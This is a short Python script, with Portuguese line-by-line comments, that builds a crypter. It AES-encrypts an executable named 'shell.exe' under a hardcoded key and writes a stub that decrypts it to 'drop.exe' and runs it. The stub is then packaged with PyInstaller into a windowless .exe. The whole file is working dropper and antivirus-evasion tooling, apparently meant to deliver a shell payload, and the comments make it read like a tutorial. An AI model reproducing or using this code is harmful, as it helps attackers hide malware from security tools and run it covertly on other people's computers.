import pyaes ###Bibliotecas importadas
import os

KEY = b"0123456789123456" ###Definindo uma chave de 16 bytes para AES.
stub_name = "stub.py"
exe_path = "shell.exe"
dropfile_name = "drop.exe"

with open(exe_path, "rb") as file: ## Abrindo o arquivo shell.exe em modo binário (rb)
    executavel = file.read() ### lendo o conteúdo do executável e armazena na variável executavel

encrypt_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(executavel) ### Criptografa os dados do executável com AES no modo CTR (Counter Mode)
###  O modo CTR permite que a criptografia funcione como um fluxo contínuo de dados, sem necessidade de padding.

stub = f"""
import pyaes 
import subprocess
dropfile_name = '{dropfile_name}'

KEY = {KEY}
encrypt_data = {encrypt_data}
decrypt_data = pyaes.AESModeOfOperationCTR(KEY).decrypt(encrypt_data)
with open(dropfile_name, "wb") as file:
    file.write(decrypt_data)

proc = subprocess.Popen(dropfile_name)
"""
### import pyaes → Importa pyaes para descriptografar o payload
### import subprocess → Importa subprocess para rodar o payload descriptografado.
### dropfile_name = '{dropfile_name}' → Define o nome do arquivo descriptografado.
### KEY = {KEY} → Define a mesma chave AES usada na criptografia.
### encrypt_data = {encrypt_data} → Armazena os dados criptografados do payload.
### decrypt_data = pyaes.AESModeOfOperationCTR(KEY).decrypt(encrypt_data) → Descriptografa o executável.
### with open(dropfile_name, "wb") as file: → Abre drop.exe em modo binário para gravação.
### file.write(decrypt_data) → Escreve o executável descriptografado no arquivo.
### proc = subprocess.Popen(dropfile_name) → Executa o payload (drop.exe).

with open("stub.py", "w") as file: ### Abre o arquivo stub.py em modo de escrita (w)
    file.write(stub) ###  Escreve o código do stub dentro do arquivo
                     ### Resultado: O arquivo stub.py conterá o código para descriptografar e executar o payload.

os.system("pyinstaller -F -w --clean {}".format(stub_name)) ### Usa os.system para rodar um comando no terminal e o comando gera um executável a partir de stub.py usando PyInstaller

### Resultado: O stub será convertido para um executável .exe, que descriptografa e executa o payload.
